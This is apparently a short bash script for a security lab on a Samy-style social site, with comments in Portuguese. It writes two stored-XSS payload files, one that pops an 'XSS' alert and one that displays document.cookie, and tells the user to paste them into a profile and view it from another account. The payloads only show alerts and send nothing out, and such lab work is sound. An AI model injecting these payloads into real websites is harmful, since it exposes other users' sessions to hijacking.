#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

cat > "$SCRIPT_DIR/task1_payload.html" <<'EOF'
<script>alert('XSS');</script>
EOF

cat > "$SCRIPT_DIR/task2_payload.html" <<'EOF'
<script>alert(document.cookie);</script>
EOF

printf 'Gerados: task1_payload.html, task2_payload.html\n'

# Testes/uso:
# - Colar task1_payload.html no perfil do Samy e visitar a pagina com outra conta
# - Esperado: alert("XSS")
# - Colar task2_payload.html e visitar a pagina com outra conta
# - Esperado: alert(document.cookie)
